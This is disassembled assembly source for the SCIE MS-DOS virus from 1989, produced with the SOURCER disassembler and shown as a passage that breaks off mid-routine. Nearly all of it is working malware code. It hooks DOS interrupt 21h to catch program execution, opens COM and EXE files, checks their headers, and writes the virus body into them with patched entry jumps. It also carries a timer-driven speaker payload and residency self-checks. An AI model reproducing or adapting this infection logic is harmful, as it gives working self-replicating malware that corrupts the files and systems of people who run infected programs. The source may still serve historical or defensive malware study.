


PAGE  60,132
NAME VSCIE
TITLE SCIE virus source
SUBTTL (c) 1989  FPL & OKa  Software
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ	SCIE virus source                (c) 1989  FPL & OKa Software    ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created with SOURCER	(Flags ON: ABCH, 5 passes)		 ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	0			; (0000:0000=56E8h)
data_2e		equ	2			; (0000:0002=26Ah)
data_3e		equ	4			; (0000:0004=756h)
data_4e		equ	6			; (0000:0006=70h)
data_5e		equ	8			; (0000:0008=16h)
data_6e		equ	0Ah			; (0000:000A=0E7Ch)
data_7e		equ	0Ch			; (0000:000C=756h)
data_8e		equ	0Eh			; (0000:000E=70h)
data_9e		equ	5Ah			; (0000:005A=0AAh)
data_10e	equ	0C5h			; (0000:00C5=6A14h)
data_11e	equ	0C7h			; (0000:00C7=2)
data_12e	equ	361h			; (0000:0361=6B0Eh)
data_13e	equ	413h			; (0000:0413=27Fh)
data_14e	equ	6Ch			; (0040:006C=0F64h)
data_15e	equ	6Eh			; (0040:006E=0Dh)
d_memtyp	equ	0	; Allocated memory type [Z=last block]
d_memown	equ	1	; Allocated memory owner
data_18e	equ	0			; (6C02:0000=0FFh)
data_19e	equ	0			; (6C03:0000=0)
data_20e	equ	2			; (6C03:0002=0)
data_21e	equ	4			; (6C03:0004=0)
data_22e	equ	6			; (6C03:0006=0)
data_23e	equ	8			; (6C03:0008=0)
data_24e	equ	0Ah			; (6C03:000A=0)
data_27e	equ	0Eh			; (6C03:000E=0)
data_28e	equ	10h			; (6C03:0010=0)
data_29e	equ	11h			; (6C03:0011=0)
data_30e	equ	12h			; (6C03:0012=0)
data_31e	equ	18h			; (6C03:0018=0)
data_32e	equ	1Ah			; (6C03:001A=0)
data_33e	equ	1Ch			; (6C03:001C=0)
data_34e	equ	1Eh			; (6C03:001E=0)
data_35e	equ	20h			; (6C03:0020=0)
data_36e	equ	2Ah			; (6C03:002A=0)
d_int21		equ	2Eh	; Interrupt 21h offset & segment
d_cerrO		equ	32h	; Critical error handler offset
d_cerrS		equ	34h	; Critical error handler segment
d_uttick	equ	36h	; User timer tick offset & segment
d_fhand		equ	3Ah	; File handler
d_ftime		equ	3Ch	; File time
d_fdate		equ	3Eh	; File date
data_45e	equ	40h			; (6C03:0040=0)
data_46e	equ	42h			; (6C03:0042=0)
data_47e	equ	56h			; (6C03:0056=0)
data_48e	equ	57h			; (6C03:0057=0)
d_fattr		equ	58h	; File attributes
data_50e	equ	59h			; (6C03:0059=0)
data_51e	equ	5Ah			; (6C03:005A=0)
data_52e	equ	5Bh			; (6C03:005B=0)
data_53e	equ	5Ch			; (6C03:005C=0)
d_ctrlc		equ	5Dh	; Ctrl-C checking
data_55e	equ	5Eh			; (6C03:005E=0)
data_56e	equ	5Fh			; (6C03:005F=0)
data_57e	equ	60h			; (6C03:0060=0)
data_58e	equ	62h			; (6C03:0062=0)
data_59e	equ	64h			; (6C03:0064=0)
data_60e	equ	66h			; (6C03:0066=0)
data_61e	equ	68h			; (6C03:0068=0)
data_72e	equ	388Fh			; (6C03:388F=0)
data_73e	equ	3E9Bh			; (6C03:3E9B=0)
data_74e	equ	93h			; (9FC0:0093=0)
data_75e	equ	94h			; (9FC0:0094=0)
data_76e	equ	17Ah			; (9FC0:017A=0)
data_77e	equ	1FBh			; (9FC0:01FB=0)

seg_a		segment
		assume	cs:seg_a, ds:seg_a


		org	100h

scie		proc	far

start:
		jmp	v_entry			; SCIE jump to entry
		int	21h			; DOS Services

		db	13 dup (90h)
		db	3Fh, 0, 90h, 90h, 90h
		db	977 dup (90h)
;
; End of NOSIC.COM, (Exit to DOS and NOP's to 1000 bytes length
;
begSCIE:
		db	8 dup (0)
		db	0F4h, 7Ah, 2Ch, 0, 0, 0
		db	0E8h, 3, 0BEh, 0Ah, 0B8h, 0
		db	4Ch, 0CDh, 21h, 90h, 90h, 90h
		db	24 dup (90h)
		db	60h, 14h, 49h, 2, 60h, 14h
		db	49h, 2, 56h, 5, 7Ch, 0Ch
		db	0E5h, 0FEh, 0, 0F0h, 5, 0
		db	0Eh, 67h, 24h, 13h, 0DEh, 0
		db	6Ah, 0, 2Eh, 83h, 3Eh, 5Eh
		db	0Ch, 56h, 7, 70h, 0, 2Eh
		db	83h, 3Eh, 5Eh, 0Ch, 56h, 7
		db	70h, 0
loc_2:
		add	[bx+si],al
		and	[bx+di],al
		add	[bx+di],al
		add	[bx+si],al
		db	73h,01h			; Jump if carry=0
		add	[bx+si],al
		adc	[bx+si],al
		add	[bx+di],al
		add	[bp+si],al
		iret				; Interrupt return
		add	al,bh
		db	11h,0c7h		;adc di,ax ?
		db	11h,0e6h		;adc si,sp
		db	0Fh, 28h, 0Eh, 0C7h, 11h, 28h
		db	0Eh, 0E6h, 0Fh, 0C4h, 17h, 0C7h
		db	11h, 0C7h, 11h, 0E6h, 0Fh, 28h
		db	0Eh, 0C7h, 11h, 0C7h, 11h, 0C7h
		db	11h, 0C7h, 11h, 0E6h, 0Fh, 28h
		db	0Eh, 59h, 0Dh, 28h, 0Eh, 0E6h
		db	0Fh, 0C7h, 11h, 0EFh, 12h, 0C4h
		db	17h, 2Ch, 15h, 0EFh, 12h, 0C7h
		db	11h, 0C7h, 11h, 2Ch, 15h, 0EFh
		db	12h, 2Ch, 15h, 0C5h, 1Ah, 2Ch
		db	15h, 0EFh, 12h, 0C7h, 11h, 2Ch
		db	15h, 0C4h, 17h, 2Ch, 15h, 0C4h
		db	17h, 0C5h, 1Ah, 67h, 1Ch, 0C5h
		db	1Ah, 0C4h, 17h, 2Ch, 15h, 0EFh
		db	12h, 2Ch, 15h, 0C5h, 1Ah, 2Ch
		db	15h, 0EFh, 12h, 0C7h, 11h, 2Ch
		db	15h, 0C4h, 17h, 0C7h, 11h, 0EFh
		db	12h, 0E6h, 0Fh, 0C7h, 11h, 0C7h
		db	11h, 0FFh, 0FFh, 5
		db	11 dup (5)
		db	9, 9
		db	12 dup (5)
		db	9, 9
		db	14 dup (5)
		db	6
		db	7 dup (5)
		db	6, 5, 5, 5, 5, 9
		db	9, 0FEh, 6, 7Ah, 7Dh, 0FEh
		db	6, 0FBh, 7Dh, 74h, 5, 0EAh
		db	0, 7Ch, 0, 0, 0FCh, 33h
		db	0C0h, 8Eh, 0C0h, 0BEh, 2Ah, 7Dh
		db	0BFh, 4Ch, 0, 0A5h, 0A5h, 26h
		db	83h, 6, 13h, 4, 2, 0EAh
		db	0, 7Ch, 0, 0
  
scie		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		mov	ax,[si]
		sub	ax,0BBh
		jc	loc_5			; Jump if carry Set
		cmp	ax,8
		nop
		jc	loc_5			; Jump if carry Set
loc_4:
		mov	[si],ax
		retn
loc_5:
		mov	ax,9
		jmp	short loc_4		; (063B)
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		push	si
		push	ds
		push	cx
		push	ds
		pop	es
		mov	ds,ds:data_57e		; (6C03:0060=0)
		lds	si,dword ptr [bx]	; Load 32 bit ptr
		mov	es:[di+5],si
		mov	es:[di+7],ds
		cmp	byte ptr [si],0CFh
		je	loc_6			; Jump if equal
		cld				; Clear direction
		mov	cx,5
		rep	movsb			; Rep while cx>0 Mov [si] to es:[di]
		mov	byte ptr [si-5],9Ah
		mov	word ptr [si-4],1C3h
		mov	[si-2],cs
loc_6:
		pop	cx
		pop	ds
		pop	si
		retn
sub_2		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		push	bx
		push	di
		mov	bx,4
		mov	di,44h
		call	sub_2			; (0643)
		mov	bx,0Ch
		mov	di,4Dh
		call	sub_2			; (0643)
		pop	di
		pop	bx
		retn
sub_3		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_4		proc	near
		push	cx
		push	di
		les	di,dword ptr [si+5]	; Load 32 bit ptr
		cmp	byte ptr es:[di],9Ah
		jne	loc_7			; Jump if not equal
		cmp	word ptr es:[di+1],1C3h
		jne	loc_7			; Jump if not equal
		mov	cx,5
		cld				; Clear direction
		rep	movsb			; Rep while cx>0 Mov [si] to es:[di]
loc_7:
		pop	di
		pop	cx
		retn
sub_4		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
		push	si
		mov	si,4Dh
		call	sub_4			; (0688)
		mov	si,44h
		call	sub_4			; (0688)
		pop	si
		retn
sub_5		endp
  
		push	bp
		mov	bp,sp
		pushf				; Push flags
		push	es
		push	ds
		push	bx
		push	ax
		push	cs
		pop	ds
		call	sub_5			; (06A4)
		mov	ax,cs
		cmp	[bp+8],ax
		je	loc_9			; Jump if equal
		mov	ds,[bp+8]
	;	cmp	word ptr [bx+2],2Ch
		db	83h,0bfh,2,0,2ch	;*Fixup for MASM (M)
		jne	loc_8			; Jump if not equal
	;	cmp	word ptr [bx+0],7AF4h
		db	81h,0bfh,0,0,0f4h,7ah	;*Fixup for MASM (M)
		jne	loc_8			; Jump if not equal
	;	cmp	word ptr [bx+8],0ABEh
		db	81h,0bfh,8,0,0beh,0ah	;*Fixup for MASM (M)
		jne	loc_8			; Jump if not equal
		mov	ax,ds
		shr	bx,1			; Shift w/zeros fill
		shr	bx,1			; Shift w/zeros fill
		shr	bx,1			; Shift w/zeros fill
		shr	bx,1			; Shift w/zeros fill
		add	ax,bx
		mov	ds,ax
		jmp	short loc_9		; (06FC)
loc_8:
		sub	word ptr [bp+2],5
		pop	ax
		pop	bx
		pop	ds
		pop	es
		popf				; Pop flags
		pop	bp
		retf				; Return far
loc_9:
		call	sub_7			; (07FE)
		mov	ax,[bp+0Ah]
		inc	byte ptr ds:data_9e	; (0000:005A=0AAh)
		test	ax,100h
		jnz	loc_10			; Jump if not zero
		dec	word ptr [bp+6]
		dec	byte ptr ds:data_9e	; (0000:005A=0AAh)
loc_10:
		and	ax,0FEFFh
		mov	[bp+0Ah],ax
		push	cs
		pop	ds
		call	sub_3			; (0671)
		pop	ax
		pop	bx
		pop	ds
		pop	es
		popf				; Pop flags
		pop	bp
		add	sp,4
		iret				; Interrupt return
		push	bp
		mov	bp,sp
		pushf				; Push flags
		push	ax
		push	bx
		push	ds
		push	es
		push	cs
		pop	ds
		call	sub_5			; (06A4)
		call	sub_3			; (0671)
		mov	ax,40h
		mov	es,ax
		test	byte ptr ds:data_55e,7	; (6C03:005E=0)
		jnz	loc_11			; Jump if not zero
		cmp	word ptr es:data_15e,11h	; (0040:006E=0Dh)
		jne	loc_11			; Jump if not equal
		cmp	word ptr es:data_14e,0	; (0040:006C=0F75h)
		jne	loc_11			; Jump if not equal
		mov	byte ptr ds:data_50e,0	; (6C03:0059=0)
		mov	word ptr ds:data_45e,0DEh	; (6C03:0040=0)
		mov	word ptr ds:data_46e,6Ah	; (6C03:0042=0)
loc_11:
		cmp	byte ptr ds:data_50e,1	; (6C03:0059=0)
		je	loc_14			; Jump if equal
		cmp	byte ptr ds:data_48e,0	; (6C03:0057=0)
		je	loc_12			; Jump if equal
		dec	byte ptr ds:data_48e	; (6C03:0057=0)
		jmp	short loc_14		; (07B4)
loc_12:
		mov	bx,ds:data_46e		; (6C03:0042=0)
		cmp	word ptr [bx],0FFFFh
		jne	loc_13			; Jump if not equal
		in	al,61h			; port 61h, 8255 port B, read
		and	al,0FCh
		out	61h,al			; port 61h, 8255 B - spkr, etc
		mov	byte ptr ds:data_50e,1	; (6C03:0059=0)
		jmp	short loc_14		; (07B4)
loc_13:
		mov	al,0B6h
		out	43h,al			; port 43h, 8253 wrt timr mode
		mov	ax,[bx]
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	al,ah
		out	42h,al			; port 42h, 8253 timer 2 spkr
		in	al,61h			; port 61h, 8255 port B, read
		or	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		add	word ptr ds:data_46e,2	; (6C03:0042=0)
		mov	bx,ds:data_45e		; (6C03:0040=0)
		mov	al,[bx]
		dec	al
		mov	ds:data_48e,al		; (6C03:0057=0)
		inc	word ptr ds:data_45e	; (6C03:0040=0)
loc_14:
		pop	es
		pop	ds
		pop	bx
		pop	ax
		popf				; Pop flags
		pop	bp
		jmp	dword ptr cs:d_uttick	; Jump to user timer tick
		jmp	dword ptr cs:data_36e	; (6C03:002A=0)
		jmp	dword ptr ds:data_36e	; (6C03:002A=0)
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		push	bp
		mov	bp,sp
		cld				; Clear direction
		push	word ptr [bp+0Ah]
		push	word ptr [bp+8]
		push	word ptr [bp+4]
		call	sub_20			; (0EB8)
		add	sp,6
		push	word ptr [bp+0Ch]
		push	word ptr [bp+6]
		push	word ptr [bp+8]
		call	sub_21			; (0F48)
		add	sp,6
		push	word ptr [bp+0Ch]
		push	word ptr [bp+8]
		push	word ptr [bp+6]
		push	word ptr [bp+4]
		call	sub_22			; (0F6F)
		add	sp,8
		pop	bp
		retn
sub_6		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_7		proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	es
		pushf				; Push flags
		cli				; Disable interrupts
		mov	ax,8
		push	ax
		mov	ax,0AEh
		push	ax
		mov	ax,0B40h
		mov	cl,4
		shr	ax,cl			; Shift w/zeros fill
		mov	dx,ds
		add	ax,dx
		push	ax
		mov	ax,0AC0h
		shr	ax,cl			; Shift w/zeros fill
		add	ax,dx
		push	ax
		mov	ax,60h
		shr	ax,cl			; Shift w/zeros fill
		add	ax,dx
		push	ax
		call	sub_6			; (07C8)
		add	sp,0Ah
		popf				; Pop flags
		pop	es
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_7		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;      MS-DOS System calls
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
;
; Write Handle
;=============
;  in: CX     Bytes to write
;      DS:DX  Pointer to buffer
; out: Carry  = 1  Error
;      AX     Bytes written
v_filewrite	proc	near
		mov	ah,40h			; '@'
		jmp	short loc_15		; (0840)
; Read Handle
;============
;  in: CX     Bytes to read
;      DS:DX  Poiner to buffer
; out: Carry  = 1  Error
;      AX     Bytes read
v_fileread:	mov	ah,3Fh			; '?'
loc_15:		call	v_2doscall		; (084C)
		jc	loc_ret_16		; Jump if carry Set
		cmp	ax,cx
loc_ret_16:	retn
v_filewrite	endp

; Move file pointer (from begin)
;===============================
;  in: CX:DX  Distance in bytes (offset)
; out: DX:AX  New read/write pointer location
v_2moveFP	proc	near
		xor	al,al			; Zero register
; Move file pointer
;==================
;  in: AL     Method of moving
;      CX:DX  Distance in bytes (offset)
; out: DX:AX  New read/write pointer location
v_moveFP:	mov	ah,42h			; 'B'
; MS-DOS call (use d_fhand file handler)
;============
v_2doscall:	mov	bx,cs:d_fhand		; (6C03:003A=0)
; MS-DOS call
;============
v_doscall:	pushf				; Push flags
		cli				; Disable interrupts
		call	dword ptr cs:d_int21	; (6C03:002E=0)
		retn
v_2moveFP	endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_14		proc	near
		push	bx
		push	ax
		mov	bx,cs:d_fhand		; (6C03:003A=0)
		mov	ah,45h			; 'E'
		call	v_doscall			; (0851)
		jc	loc_17			; Jump if carry Set
		mov	bx,ax
		mov	ah,3Eh			; '>'
		call	v_doscall			; (0851)
		jmp	short loc_18		; (0871)
loc_17:
		clc				; Clear carry flag
loc_18:
		pop	ax
		pop	bx
		retn
sub_14		endp
  
		mov	al,3
		iret				; Interrupt return
v_dC603:
		mov	ax,2Dh
		test	byte ptr cs:data_56e,2	; (6C03:005F=0)
		jnz	loc_20			; Jump if not zero
		dec	ax
loc_20:
		cmp	bx,ax
		xor	al,al			; Zero register
		rcl	al,1			; Rotate thru carry
		push	ax
		mov	ax,2Ch
		test	byte ptr cs:data_56e,4	; (6C03:005F=0)
		jnz	loc_21			; Jump if not zero
		inc	ax
loc_21:
		cmp	bx,ax
		les	bx,dword ptr cs:d_int21	; (6C03:002E=0) Load 32 bit ptr
		pop	ax
		inc	sp
		inc	sp
		sti				; Enable interrupts
		retf	2			; Return far
v_dC600:
		mov	ax,2Ch
		jmp	short v_dosC5		; (08DB)
v_dC601:
		mov	al,cs:data_56e		; (6C03:005F=0)
		xor	ah,ah			; Zero register
		jmp	short v_dosC5		; (08DB)

v_dC602:	mov	cs:data_56e,cl		; (6C03:005F=0)
		jmp	short v_dosC5		; (08DB)
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
; New INT 21h handler
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
v_new21:	pushf
		cmp	ah,4Bh			; Load and execute service
		je	v_dos4B
		cmp	ah,0C5h
		je	v_dosC5
		cmp	ax,0C600h
		je	v_dC600
		cmp	ax,0C601h
		je	v_dC601
		cmp	ax,0C602h
		je	v_dC602
		cmp	ax,0C603h
		je	v_dC603
		popf
		jmp     000:000
v_dosC5:		popf
		sti				; Enable interrupt
		stc				; Set carry
		retf	2			; Ciao!
v_dos4B:
		push	ax
		xor	al,al			; Zero register
		xchg	al,cs:data_53e		; (6C03:005C=0)
		or	al,al			; Zero ?
		pop	ax
		jnz	loc_27			; Jump if not zero
		popf				; Pop flags
		jmp	loc_49			; (0BB9)
loc_27:
		push	ds
		push	cs
		pop	ds
		call	sub_7			; (07FE)
		mov	word ptr ds:data_12e,9090h	; (0000:0361=6B0Eh)
		call	sub_7			; (07FE)
		pop	ds
		push	es
		push	ds
		push	bp
		push	di
		push	si
		push	dx
		push	cx
		push	bx
		push	ax
		mov	bp,sp
		push	cs
		pop	ds
		cmp	byte ptr ds:data_51e,0	; (6C03:005A=0)
		je	loc_28			; Jump if equal
		jmp	loc_48			; (0BAA)
loc_28:
		inc	byte ptr ds:data_55e	; (6C03:005E=0)
		push	word ptr [bp+0Eh]
		push	word ptr [bp+6]
		call	v_fileUP		; (0BD9)
		lahf				; Load ah from flags
		add	sp,4
		sahf				; Store ah into flags
		jnc	loc_29			; Jump if carry=0
		jmp	loc_48			; (0BAA)
loc_29:
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	v_2moveFP		; (0848)
		mov	dx,0Ah
		mov	cx,14h
		call	v_fileread		; (083E)
		jc	loc_32			; Jump if carry Set
		mov	ax,ds:data_33e		; (6C03:001C=0)
		mul	word ptr ds:data_58e	; (6C03:0062=0) ax = data * ax
		mov	cx,dx
		mov	dx,ax
		call	v_2moveFP		; (0848)
		mov	dx,0
		mov	cx,2Ah
		call	v_fileread		; (083E)
		jc	loc_34			; Jump if carry Set
		cmp	word ptr ds:data_19e,7AF4h	; (6C03:0000=0)
		jne	loc_34			; Jump if not equal
		mov	ax,2Ch
		cmp	byte ptr [bp],0
		jne	loc_30			; Jump if not equal
		test	byte ptr ds:data_56e,2	; (6C03:005F=0)
		jz	loc_31			; Jump if zero
loc_30:
		inc	ax
loc_31:
		cmp	ds:data_20e,ax		; (6C03:0002=0)
		jae	loc_32			; Jump if above or =
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	v_2moveFP		; (0848)
		mov	dx,0Ah
		mov	cx,20h
		call	v_filewrite		; (083A)
		jc	loc_32			; Jump if carry Set
		call	sub_14			; (0859)
		jnc	loc_33			; Jump if carry=0
loc_32:
		jmp	loc_47			; (0B9E)
loc_33:
		mov	cx,ds:data_21e		; (6C03:0004=0)
		mov	dx,ds:data_22e		; (6C03:0006=0)
		call	v_2moveFP		; (0848)
		xor	cx,cx			; Zero register
		call	v_filewrite		; (083A)
		jc	loc_32			; Jump if carry Set
		call	sub_14			; (0859)
		jc	loc_32			; Jump if carry Set
		jmp	short loc_29		; (0930)
loc_34:
		mov	al,2
		mov	cx,0FFFFh
		mov	dx,0FFF8h
		call	v_moveFP		; (084A)
		mov	dx,0Ah
		mov	cx,8
		call	v_fileread		; (083E)
		jc	loc_35			; Jump if carry Set
		cmp	word ptr ds:data_27e,7AF4h	; (6C03:000E=0)
		je	loc_36			; Jump if equal
		jmp	short loc_39		; (0A28)
loc_35:
		jmp	loc_47			; (0B9E)
loc_36:
		cmp	byte ptr ds:data_28e,23h	; (6C03:0010=0) '#'
		jae	loc_35			; Jump if above or =
		mov	cl,ds:data_29e		; (6C03:0011=0)
		mov	ax,ds:data_24e		; (6C03:000A=0)
		mov	ds:data_22e,ax		; (6C03:0006=0)
		mov	ax,word ptr ds:data_24e+2	; (6C03:000C=0)
		sub	ax,103h
		mov	word ptr ds:data_24e+1,ax	; (6C03:000B=0)
		cmp	byte ptr ds:data_28e,9	; (6C03:0010=0)
		ja	loc_37			; Jump if above
		mov	cl,0E9h
loc_37:
		mov	ds:data_24e,cl		; (6C03:000A=0)
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	v_2moveFP		; (0848)
		mov	dx,0Ah
		mov	cx,3
		call	v_filewrite		; (083A)
		jc	loc_35			; Jump if carry Set
		call	sub_14			; (0859)
		jc	loc_35			; Jump if carry Set
		xor	cx,cx			; Zero register
		mov	dx,ds:data_22e		; (6C03:0006=0)
		call	v_2moveFP		; (0848)
		xor	cx,cx			; Zero register
		call	v_filewrite		; (083A)
		jc	loc_38			; Jump if carry Set
		call	sub_14			; (0859)
		jc	loc_38			; Jump if carry Set
		jmp	short loc_34		; (09AD)
loc_38:
		jmp	loc_47			; (0B9E)
loc_39:
		mov	word ptr ds:data_19e,7AF4h	; (6C03:0000=0)
		mov	word ptr ds:data_20e,2Ch	; (6C03:0002=0)
		mov	word ptr ds:data_23e,0ABEh	; (6C03:0008=0)
		cmp	byte ptr [bp],0
		jne	loc_38			; Jump if not equal
		test	byte ptr ds:data_56e,1	; (6C03:005F=0)
		jz	loc_38			; Jump if zero
		mov	al,2
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	v_moveFP		; (084A)
		mov	ds:data_21e,dx		; (6C03:0004=0)
		mov	ds:data_22e,ax		; (6C03:0006=0)
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	v_2moveFP		; (0848)
		mov	dx,0Ah
		mov	cx,20h
		call	v_fileread		; (083E)
		jc	loc_38			; Jump if carry Set
		cmp	word ptr ds:data_24e,5A4Dh	; (6C03:000A=0)
		je	loc_40			; Jump if equal
		cmp	word ptr ds:data_24e,4D5Ah	; (6C03:000A=0)
		jne	loc_42			; Jump if not equal
loc_40:
		mov	byte ptr ds:data_52e,0	; (6C03:005B=0)
		mov	ax,ds:data_27e		; (6C03:000E=0)
		mul	word ptr ds:data_60e	; (6C03:0066=0) ax = data * ax
		sub	ax,ds:data_22e		; (6C03:0006=0)
		sbb	dx,ds:data_21e		; (6C03:0004=0)
		jc	loc_41			; Jump if carry Set
		mov	ax,ds:data_31e		; (6C03:0018=0)
		mul	word ptr ds:data_58e	; (6C03:0062=0) ax = data * ax
		add	ax,ds:data_32e		; (6C03:001A=0)
		mov	cx,dx
		mov	bx,ax
		mov	ax,ds:data_30e		; (6C03:0012=0)
		mul	word ptr ds:data_58e	; (6C03:0062=0) ax = data * ax
		mov	di,ds:data_21e		; (6C03:0004=0)
		mov	si,ds:data_22e		; (6C03:0006=0)
		add	si,0Fh
		adc	di,0
		and	si,0FFF0h
		sub	si,ax
		sbb	di,dx
		mov	dx,cx
		mov	ax,bx
		sub	ax,si
		sbb	dx,di
		jc	loc_43			; Jump if carry Set
		add	si,0DC0h
		adc	di,0
		sub	bx,si
		sbb	cx,di
		jnc	loc_43			; Jump if carry=0
loc_41:
		jmp	loc_47			; (0B9E)
loc_42:
		mov	byte ptr ds:data_52e,1	; (6C03:005B=0)
		cmp	word ptr ds:data_21e,0	; (6C03:0004=0)
		jne	loc_41			; Jump if not equal
		cmp	word ptr ds:data_22e,20h	; (6C03:0006=0)
		jbe	loc_41			; Jump if below or =
		cmp	word ptr ds:data_22e,0F277h	; (6C03:0006=0)
		jae	loc_41			; Jump if above or =
loc_43:
		mov	cx,ds:data_21e		; (6C03:0004=0)
		mov	dx,ds:data_22e		; (6C03:0006=0)
		add	dx,0Fh
		adc	cx,0
		and	dx,0FFF0h
		call	v_2moveFP		; (0848)
		xor	dx,dx			; Zero register
		mov	cx,0B41h
		push	word ptr ds:data_56e	; (6C03:005F=0)
		mov	byte ptr ds:data_56e,1	; (6C03:005F=0)
		call	v_filewrite		; (083A)
		pop	cx
		mov	ds:data_56e,cl		; (6C03:005F=0)
		jc	loc_41			; Jump if carry Set
		cmp	byte ptr ds:data_52e,0	; (6C03:005B=0)
		je	loc_44			; Jump if equal
		mov	cx,4
		call	v_filewrite		; (083A)
loc_44:
		call	sub_14			; (0859)
		jc	loc_41			; Jump if carry Set
		mov	dx,ds:data_21e		; (6C03:0004=0)
		mov	ax,ds:data_22e		; (6C03:0006=0)
		add	ax,0Fh
		adc	dx,0
		and	ax,0FFF0h
		div	word ptr ds:data_58e	; (6C03:0062=0) ax,dxrem=dx:ax/data
		mov	ds:data_33e,ax		; (6C03:001C=0)
